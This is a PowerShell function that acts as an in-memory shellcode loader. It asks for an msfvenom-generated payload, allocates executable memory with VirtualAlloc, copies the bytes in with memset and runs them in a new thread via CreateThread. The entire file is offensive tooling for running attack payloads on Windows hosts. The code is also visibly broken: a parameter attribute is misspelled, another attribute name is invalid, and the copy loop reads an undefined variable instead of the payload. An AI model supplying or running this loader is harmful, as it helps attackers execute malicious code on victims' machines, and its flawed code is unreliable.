Function Invoke-InMemoryPayload
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Poisition=0,
                ValueFromPipeline=$True, 
                ValueFromPipelineByPropertyValue=$True,
                HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
            [Byte[]]$Payload
        )  # End param

    $CSCode = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

    Write-Verbose "Importing DLL's..."
    $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
    $Size = 0x1000

    If ($Payload.Length -gt 0x1000) 
    {

        $Size = $Payload.Length
        
        Write-Verbose "Length of payload is $Size"

    }  # End If

    Write-Verbose "Allocating a block of memory for execution using VirtualAlloc()..."
    $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)

    Write-Verbose "Writing payload to newly allocated memory block using memset()..."
    For ( $i = 0 ; $i -le ($Payload.Length - 1); $i++ ) 
    {
        
        $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)

    }  # End For

    Write-Verbose "Executing in separte thread using CreateThread()..."
    $WinFunc::CreateThread(0,0,$X,0,0,0)
    for (;;) 
    { 
        
        Start-sleep 60 

    }  # End For

}  # End Invoke-InMemoryPayload
